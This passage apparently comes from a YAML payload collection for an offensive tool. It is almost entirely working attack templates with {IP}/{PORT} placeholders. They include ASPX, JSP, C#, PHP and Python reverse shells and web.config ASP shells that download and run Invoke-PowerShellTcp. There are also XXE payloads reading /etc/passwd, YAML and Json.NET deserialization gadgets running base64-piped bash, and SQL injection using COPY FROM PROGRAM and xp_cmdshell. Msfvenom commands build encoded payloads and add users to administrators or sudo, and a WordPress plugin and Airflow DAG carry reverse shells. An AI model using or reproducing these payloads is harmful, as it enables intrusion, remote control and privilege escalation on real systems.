      public IntPtr hStdInput;
      public IntPtr hStdOutput;
      public IntPtr hStdError;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct PROCESS_INFORMATION
      {
      public IntPtr hProcess;
      public IntPtr hThread;
      public uint dwProcessId;
      public uint dwThreadId;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct SECURITY_ATTRIBUTES
      {
      public int Length;
      public IntPtr lpSecurityDescriptor;
      public bool bInheritHandle;
      }


      [DllImport("kernel32.dll")]
      static extern bool CreateProcess(string lpApplicationName,
      string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
      ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
      uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
      [In] ref STARTUPINFO lpStartupInfo,
      out PROCESS_INFORMATION lpProcessInformation);

      public static uint INFINITE = 0xFFFFFFFF;

      [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
      internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

      internal struct sockaddr_in
      {
      public short sin_family;
      public short sin_port;
      public int sin_addr;
      public long sin_zero;
      }

      [DllImport("kernel32.dll")]
      static extern IntPtr GetStdHandle(int nStdHandle);

      [DllImport("kernel32.dll")]
      static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

      public const int STD_INPUT_HANDLE = -10;
      public const int STD_OUTPUT_HANDLE = -11;
      public const int STD_ERROR_HANDLE = -12;

      [DllImport("kernel32")]
      static extern bool AllocConsole();


      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
      [In] SocketType socketType,
      [In] ProtocolType protocolType,
      [In] IntPtr protocolInfo,
      [In] uint group,
      [In] int flags
      );

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern int inet_addr([In] string cp);
      [DllImport("ws2_32.dll")]
      private static extern string inet_ntoa(uint ip);

      [DllImport("ws2_32.dll")]
      private static extern uint htonl(uint ip);

      [DllImport("ws2_32.dll")]
      private static extern uint ntohl(uint ip);

      [DllImport("ws2_32.dll")]
      private static extern ushort htons(ushort ip);

      [DllImport("ws2_32.dll")]
      private static extern ushort ntohs(ushort ip);


      [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
      internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern int send(
      [In] IntPtr socketHandle,
      [In] byte[] pinnedBuffer,
      [In] int len,
      [In] SocketFlags socketFlags
      );

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern int recv(
      [In] IntPtr socketHandle,
      [In] IntPtr pinnedBuffer,
      [In] int len,
      [In] SocketFlags socketFlags
      );

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern int closesocket(
      [In] IntPtr socketHandle
      );

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern IntPtr accept(
      [In] IntPtr socketHandle,
      [In, Out] ref sockaddr_in socketAddress,
      [In, Out] ref int socketAddressSize
      );

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern int listen(
      [In] IntPtr socketHandle,
      [In] int backlog
      );

      [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
      internal static extern int bind(
      [In] IntPtr socketHandle,
      [In] ref sockaddr_in  socketAddress,
      [In] int socketAddressSize
      );


      public enum TOKEN_INFORMATION_CLASS
      {
      TokenUser = 1,
      TokenGroups,
      TokenPrivileges,
      TokenOwner,
      TokenPrimaryGroup,
      TokenDefaultDacl,
      TokenSource,
      TokenType,
      TokenImpersonationLevel,
      TokenStatistics,
      TokenRestrictedSids,
      TokenSessionId
      }

      [DllImport("advapi32", CharSet = CharSet.Auto)]
      public static extern bool GetTokenInformation(
      IntPtr hToken,
      TOKEN_INFORMATION_CLASS tokenInfoClass,
      IntPtr TokenInformation,
      int tokeInfoLength,
      ref int reqLength);

      public enum TOKEN_TYPE
      {
      TokenPrimary = 1,
      TokenImpersonation
      }

      public enum SECURITY_IMPERSONATION_LEVEL
      {
      SecurityAnonymous,
      SecurityIdentification,
      SecurityImpersonation,
      SecurityDelegation
      }


      [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
      public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
      ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
      String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

      [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
      public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
      ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
      ref IntPtr DuplicateTokenHandle);



      const int ERROR_NO_MORE_ITEMS = 259;

      [StructLayout(LayoutKind.Sequential)]
      struct TOKEN_USER
      {
      public _SID_AND_ATTRIBUTES User;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct _SID_AND_ATTRIBUTES
      {
      public IntPtr Sid;
      public int Attributes;
      }

      [DllImport("advapi32", CharSet = CharSet.Auto)]
      public extern static bool LookupAccountSid
      (
      [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
      IntPtr pSid,
      StringBuilder Account,
      ref int cbName,
      StringBuilder DomainName,
      ref int cbDomainName,
      ref int peUse

      );

      [DllImport("advapi32", CharSet = CharSet.Auto)]
      public extern static bool ConvertSidToStringSid(
      IntPtr pSID,
      [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


      [DllImport("kernel32.dll", SetLastError = true)]
      public static extern bool CloseHandle(
      IntPtr hHandle);

      [DllImport("kernel32.dll", SetLastError = true)]
      public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
      [Flags]
      public enum ProcessAccessFlags : uint
      {
      All = 0x001F0FFF,
      Terminate = 0x00000001,
      CreateThread = 0x00000002,
      VMOperation = 0x00000008,
      VMRead = 0x00000010,
      VMWrite = 0x00000020,
      DupHandle = 0x00000040,
      SetInformation = 0x00000200,
      QueryInformation = 0x00000400,
      Synchronize = 0x00100000
      }

      [DllImport("kernel32.dll")]
      static extern IntPtr GetCurrentProcess();

      [DllImport("kernel32.dll")]
      extern static IntPtr GetCurrentThread();


      [DllImport("kernel32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

      [DllImport("psapi.dll", SetLastError = true)]
      public static extern bool EnumProcessModules(IntPtr hProcess,
      [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,uint cb,
      [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

      [DllImport("psapi.dll")]
      static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

      public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
      public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
      public const uint PIPE_ACCESS_INBOUND = 0x00000001;
      public const uint PIPE_WAIT = 0x00000000;
      public const uint PIPE_NOWAIT = 0x00000001;
      public const uint PIPE_READMODE_BYTE = 0x00000000;
      public const uint PIPE_READMODE_MESSAGE = 0x00000002;
      public const uint PIPE_TYPE_BYTE = 0x00000000;
      public const uint PIPE_TYPE_MESSAGE = 0x00000004;
      public const uint PIPE_CLIENT_END = 0x00000000;
      public const uint PIPE_SERVER_END = 0x00000001;
      public const uint PIPE_UNLIMITED_INSTANCES = 255;

      public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
      public const uint NMPWAIT_NOWAIT = 0x00000001;
      public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

      public const uint GENERIC_READ = (0x80000000);
      public const uint GENERIC_WRITE = (0x40000000);
      public const uint GENERIC_EXECUTE = (0x20000000);
      public const uint GENERIC_ALL = (0x10000000);

      public const uint CREATE_NEW = 1;
      public const uint CREATE_ALWAYS = 2;
      public const uint OPEN_EXISTING = 3;
      public const uint OPEN_ALWAYS = 4;
      public const uint TRUNCATE_EXISTING = 5;

      public const int INVALID_HANDLE_VALUE = -1;

      public const ulong ERROR_SUCCESS = 0;
      public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
      public const ulong ERROR_PIPE_BUSY = 231;
      public const ulong ERROR_NO_DATA = 232;
      public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
      public const ulong ERROR_MORE_DATA = 234;
      public const ulong ERROR_PIPE_CONNECTED = 535;
      public const ulong ERROR_PIPE_LISTENING = 536;

      [DllImport("kernel32.dll", SetLastError = true)]
      public static extern IntPtr CreateNamedPipe(
      String lpName,
      uint dwOpenMode,
      uint dwPipeMode,
      uint nMaxInstances,
      uint nOutBufferSize,
      uint nInBufferSize,
      uint nDefaultTimeOut,
      IntPtr pipeSecurityDescriptor
      );

      [DllImport("kernel32.dll", SetLastError = true)]
      public static extern bool ConnectNamedPipe(
      IntPtr hHandle,
      uint lpOverlapped
      );

      [DllImport("Advapi32.dll", SetLastError = true)]
      public static extern bool ImpersonateNamedPipeClient(
      IntPtr hHandle);

      [DllImport("kernel32.dll", SetLastError = true)]
      public static extern bool GetNamedPipeHandleState(
      IntPtr hHandle,
      IntPtr lpState,
      IntPtr lpCurInstances,
      IntPtr lpMaxCollectionCount,
      IntPtr lpCollectDataTimeout,
      StringBuilder lpUserName,
      int nMaxUserNameSize
      );

      protected void CallbackShell(string server, int port)
      {

      string request = "Spawn Shell...\n";
      Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

      IntPtr oursocket = IntPtr.Zero;

      sockaddr_in socketinfo;
      oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
      socketinfo = new sockaddr_in();
      socketinfo.sin_family = (short) AddressFamily.InterNetwork;
      socketinfo.sin_addr = inet_addr(server);
      socketinfo.sin_port = (short) htons((ushort)port);
      connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
      send(oursocket, bytesSent, request.Length, 0);
      SpawnProcessAsPriv(oursocket);
      closesocket(oursocket);
      }

      protected void SpawnProcess(IntPtr oursocket)
      {
      bool retValue;
      string Application = Environment.GetEnvironmentVariable("comspec");
      PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
      STARTUPINFO sInfo = new STARTUPINFO();
      SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
      pSec.Length = Marshal.SizeOf(pSec);
      sInfo.dwFlags = 0x00000101;
      sInfo.hStdInput = oursocket;
      sInfo.hStdOutput = oursocket;
      sInfo.hStdError = oursocket;
      retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
      WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
      }

      protected void SpawnProcessAsPriv(IntPtr oursocket)
      {
      bool retValue;
      string Application = Environment.GetEnvironmentVariable("comspec");
      PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
      STARTUPINFO sInfo = new STARTUPINFO();
      SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
      pSec.Length = Marshal.SizeOf(pSec);
      sInfo.dwFlags = 0x00000101;
      IntPtr DupeToken = new IntPtr(0);
      sInfo.hStdInput = oursocket;
      sInfo.hStdOutput = oursocket;
      sInfo.hStdError = oursocket;
      if (DupeToken == IntPtr.Zero)
      retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
      else
      retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
      WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
      CloseHandle(DupeToken);
      }
      </script>
    - |
      #Save as web.config

      <?xml version="1.0" encoding="UTF-8"?>
      <configuration>
      <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
      <requestFiltering>
      <fileExtensions>
      <remove fileExtension=".config" />
      </fileExtensions>
      <hiddenSegments>
      <remove segment="web.config" />
      </hiddenSegments>
      </requestFiltering>
      </security>
      </system.webServer>
      </configuration>
      <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
      <%
      Set rs = CreateObject("WScript.Shell")
      Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://{IP}/Invoke-PowerShellTcp.ps1')")
      o = cmd.StdOut.Readall()
      Response.write(o)
      %>
      -->
    - |
      => Original (From Base64) : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1

      <% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_2}").StdOut.Readall() %>
    - |
      => Original (From Base64) : IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}

      <% response.write CreateObject("WScript.Shell").Exec("cmd /c powershell.exe -e {BASE64PS1_3}").StdOut.Readall() %>
    - |
      <% eval request("cmd") %>
  xxe:
    - |
      #Payload (Save as shell.sh)

      echo {BASE64} | base64 -d | bash

      #Step 1: Download reverse Shell

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE root [<!ENTITY test SYSTEM "expect://curl$IFS'{IP}/shell.sh'$IFS-o$IFS/tmp/shell.sh">]>
      <root>
      <email>&test;</email>
      </root>

      #Step 2: Run Reverse Shell

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE root [<!ENTITY test SYSTEM "expect://bash$IFS/tmp/shell.sh">]>
      <root>
      <email>&test;</email>
      </root>
    - |
      #Extra

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE replace [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'> ]>
      <comment>
        <name>&xxe;</name>
        <author>test</author>
        <com>test</com>
      </comment>
    - |
      #Extra

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE replace [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'> ]>
      <data>
        <name>&xxe;</name>
      </data>
    - |
      #Extra

      # send this on the application
      <?xml version="1.0" ?>
      <!DOCTYPE message [
        <!ENTITY % ext SYSTEM "http://10.10.10.10/poc.dtd">
        %ext;
      ]>
      <message></message>

      # content of poc.dtd
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
      %eval;
      %error;
  jsp:
    - |
      #Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw > shell.jsp

      <%@page import="java.lang.*"%>
      <%@page import="java.util.*"%>
      <%@page import="java.io.*"%>
      <%@page import="java.net.*"%>
      class StreamConnector extends Thread
      InputStream zl;
      OutputStream kh;
      StreamConnector( InputStream zl, OutputStream kh )
      {
      this.zl = zl;
      this.kh = kh;
      }
      public void run()
      {
      BufferedReader eo  = null;
      BufferedWriter iqz = null;
      try
      {
      eo  = new BufferedReader( new InputStreamReader( this.zl ) );
      iqz = new BufferedWriter( new OutputStreamWriter( this.kh ) );
      char buffer[] = new char[8192];
      int length;
      while( ( length = eo.read( buffer, 0, buffer.length ) ) > 0 )
      {
      iqz.write( buffer, 0, length );
      iqz.flush();
      }
      } catch( Exception e ){}
      try
      {
      if( eo != null )
      eo.close();
      if( iqz != null )
      iqz.close();
      } catch( Exception e ){}
      }
      try
      String ShellPath;
      if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
      ShellPath = new String("/bin/sh");
      } else {
      ShellPath = new String("cmd.exe");
      Socket socket = new Socket( "{IP}", {PORT} );
      Process process = Runtime.getRuntime().exec( ShellPath );
      ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
      ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
      } catch( Exception e ) {}
  c#:
    - |
      #Windows (Save as shell.cs)

      using System;
      using System.Text;
      using System.IO;
      using System.Diagnostics;
      using System.ComponentModel;
      using System.Linq;
      using System.Net;
      using System.Net.Sockets;

      namespace ConnectBack
      {
      public class Program
      {
      static StreamWriter streamWriter;

      public static void Main(string[] args)
      {
      using(TcpClient client = new TcpClient("{IP}", {PORT}))
      {
      using(Stream stream = client.GetStream())
      {
      using(StreamReader rdr = new StreamReader(stream))
      {
      streamWriter = new StreamWriter(stream);

      StringBuilder strInput = new StringBuilder();

      Process p = new Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.CreateNoWindow = true;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.RedirectStandardInput = true;
      p.StartInfo.RedirectStandardError = true;
      p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
      p.Start();
      p.BeginOutputReadLine();

      while(true)
      {
      strInput.Append(rdr.ReadLine());
      //strInput.Append("\n");
      p.StandardInput.WriteLine(strInput);
      strInput.Remove(0, strInput.Length);
      }
      }
      }
      }
      }

      private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
      {
      StringBuilder strOutput = new StringBuilder();

      if (!String.IsNullOrEmpty(outLine.Data))
      {
      try
      {
      strOutput.Append(outLine.Data);
      streamWriter.WriteLine(strOutput);
      streamWriter.Flush();
      }
      catch (Exception err) { }
      }
      }

      }
      }
    - |
      #Linux (Save as shell.cs)
      # dotnet new console
      # replace Program.cs Content
      # dotnet build
      # dotnet run

      using System;
      using System.Text;
      using System.IO;
      using System.Diagnostics;
      using System.ComponentModel;
      using System.Linq;
      using System.Net;
      using System.Net.Sockets;


      namespace ConnectBack
      {
      public class Program
      {
      static StreamWriter streamWriter;

      public static void Main(string[] args)
      {
      using(TcpClient client = new TcpClient("{IP}", {PORT}))
      {
      using(Stream stream = client.GetStream())
      {
      using(StreamReader rdr = new StreamReader(stream))
      {
      streamWriter = new StreamWriter(stream);

      StringBuilder strInput = new StringBuilder();

      Process p = new Process();
      p.StartInfo.FileName = "/bin/sh";
      p.StartInfo.CreateNoWindow = true;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.RedirectStandardInput = true;
      p.StartInfo.RedirectStandardError = true;
      p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
      p.Start();
      p.BeginOutputReadLine();

      while(true)
      {
      strInput.Append(rdr.ReadLine());
      //strInput.Append("\n");
      p.StandardInput.WriteLine(strInput);
      strInput.Remove(0, strInput.Length);
      }
      }
      }
      }
      }

      private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
      {
      StringBuilder strOutput = new StringBuilder();

      if (!String.IsNullOrEmpty(outLine.Data))
      {
      try
      {
      strOutput.Append(outLine.Data);
      streamWriter.WriteLine(strOutput);
      streamWriter.Flush();
      }
      catch (Exception err) { }
      }
      }

      }
      }
  xsl:
    - |
      # Save as shell.xsl

      <?xml version="1.0" encoding="UTF-8"?>
      <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
      <body>
      <xsl:value-of select="php:function('system','echo {BASE64} | base64 -d | bash')" />
      </body>
      </html>
  yaml:
    - |
      --- !ruby/object:Gem::Requirement
      requirements:
        !ruby/object:Gem::DependencyList
        specs:
        - !ruby/object:Gem::Source::SpecificFile
          spec: &1 !ruby/object:Gem::StubSpecification
            loaded_from: "|echo {BASE64} | base64 -d | bash 1>&2"
        - !ruby/object:Gem::Source::SpecificFile
            spec:
    - |
      - !ruby/object:Gem::Installer
          i: x
      - !ruby/object:Gem::SpecFetcher
          i: y
      - !ruby/object:Gem::Requirement
        requirements:
          !ruby/object:Gem::Package::TarReader
          io: &1 !ruby/object:Net::BufferedIO
            io: &1 !ruby/object:Gem::Package::TarReader::Entry
               read: 0
               header: "abc"
            debug_output: &1 !ruby/object:Net::WriteAdapter
               socket: &1 !ruby/object:Gem::RequestSet
                   sets: !ruby/object:Net::WriteAdapter
                       socket: !ruby/module 'Kernel'
                       method_id: :system
                   git_set: "echo {BASE64} | base64 -d | bash"
               method_id: :resolve
    - |
      # Python (PyYAML #1)

      !!python/object/apply:subprocess.Popen
      - !!python/tuple
        - python
        - -c
        - "__import__('os').system(str(__import__('base64').b64decode('{BASE64_FULL}').decode()))"

      {YAML_PY}
    - |
      # Python (PyYAML #2)

      !!python/object/apply:subprocess.Popen
      - !!python/tuple
        - python
        - -c
        - "__import__('os').system('echo {BASE64} | base64 -d | bash')"

      {YAML_PY}
    - |
      # Python3 (PyYAML #1)

      !!python/object/apply:subprocess.Popen
      - !!python/tuple
        - python3
        - -c
        - "__import__('os').system(str(__import__('base64').b64decode('{BASE64_FULL}').decode()))"

      {YAML_PY}
    - |
      # Python3 (PyYAML #2)

      !!python/object/apply:subprocess.Popen
      - !!python/tuple
        - python3
        - -c
        - "__import__('os').system('echo {BASE64} | base64 -d | bash')"

      {YAML_PY}
    - |
      # Python (unsafeload)
      !!python/object/apply:subprocess.getoutput
        - echo {BASE64} | base64 -d | bash

      {YAML_PY}
  sql:
    - |
      # PostgreSQL (1)

      username=';DROP+TABLE+IF+EXISTS+cmd_exec;--&password='
      username=';CREATE+TABLE+cmd_exec(cmd_output+text);--&password='
      username=';COPY+cmd_exec+FROM+PROGRAM+'bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%22';--&password='
      username=';SELECT+*+FROM+cmd_exec;--&password='
    - |
      # PostgreSQL (2)

      DROP TABLE IF EXISTS cmd_exec;
      CREATE TABLE cmd_exec(cmd_output text);
      COPY cmd_exec FROM PROGRAM 'echo {BASE64} | base64 -d | bash';
      SELECT * FROM cmd_exec;
    - |
      # MSSQL (1)

      EXEC sp_configure 'show advanced options',1;
      RECONFIGURE;
      EXEC sp_configure 'xp_cmdshell',1;
      RECONFIGURE;
      EXEC xp_cmdshell "powershell iex(iwr -usebasicparsing http://{IP}/shell.ps1)";

      => You can try use : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
  wordpress:
    - |
      <?php

      /**
      * Plugin Name: Reverse Shell Plugin
      * Plugin URI:
      * Description: Reverse Shell Plugin
      * Version: 1.0
      * Author: H0j3n
      * Author URI: https://h0j3n.blog/
      */

      exec("/bin/bash -c 'bash -i > /dev/tcp/{IP}/{PORT} 0>&1'");
      ?>

      => save as shell.php
      => zip shell.zip shell.php
      => Upload Plugin and Activate
  json.net:
    - |
      {
      '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
      'MethodName':'Start',
      'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c powershell.exe iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)']
      },
      'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
      }
    - |
      {
      '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
      'MethodName':'Start',
      'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['powershell', 'iex(iwr -usebasicparsing http://{IP}/Invoke-PowerShellTcp.ps1)']
      },
      'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
      }

      ## References
      - https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
  msf_raw:
    - |
      msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o payload.bin

      msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f raw -o payload.bin
    - |
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -o payload.bin

      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -o payload.bin
    - |
      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f raw -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.bin

      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin

      msfvenom -p windows/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw

      msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.raw

      msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin

      msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f raw -o payload.bin
  msf_dll:
    - |
      msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o payload.dll

      msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f dll -o payload.dll
    - |
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -o payload.dll

      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -o payload.dll
    - |
      msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f dll -e x86/shikata_ga_nai -b '\x00' -i 3 -o payload.dll

      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll

      msfvenom -p windows/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll

      msfvenom -p windows/x64/exec CMD='cmd.exe /k "net localgroup administrators username /add"' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll

      msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll

      msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f dll -o payload.dll
  msf_elf:
    - |
      msfvenom -p linux/x64/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf

      msfvenom -p linux/x86/shell/reverse_tcp LHOST={IP} LPORT={PORT} -f elf -o shell.elf
    - |
      msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -o shell.elf

      msfvenom -p linux/x86//meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -o shell.elf
    - |
      msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={IP} LPORT=443 -f elf -e x86/shikata_ga_nai -i 3 -o shell.elf

      msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={IP} LPORT=443 --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf

      msfvenom -p linux/x86/exec CMD='sudo usermod -aG sudo username' EXITFUNC=none --encrypt rc4 --encrypt-key{RC4RANDOM} -f elf -o payload.elf

      msfvenom -p linux/x64/exec CMD='sudo usermod -aG sudo username' EXITFUNC=none --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o payload.elf

      msfvenom -p linux/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf

      msfvenom -p linux/x86/shell/reverse_tcp LHOST={IP} LPORT={PORT} --encrypt rc4 --encrypt-key {RC4RANDOM} -f elf -o shell.elf
  dag:
    - |
      => Save it as script.py and put into /dags directory

      [Example DAG demonstrating the usage of the PythonOperator.]
      from airflow import DAG
      import socket
      import subprocess
      import os

      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(("{IP}",{PORT}))
      os.dup2(s.fileno(),0)
      os.dup2(s.fileno(),1)
      os.dup2(s.fileno(),2)
      p=subprocess.call(["/bin/sh","-i"])
  firebird:
    - |
      => Save this as exploit.sql and transfer to victim machine.
      => Base64 (Original) = IEX(New-Object Net.WebClient).downloadString('http://{IP}/Invoke-PowerShellTcp.ps1')

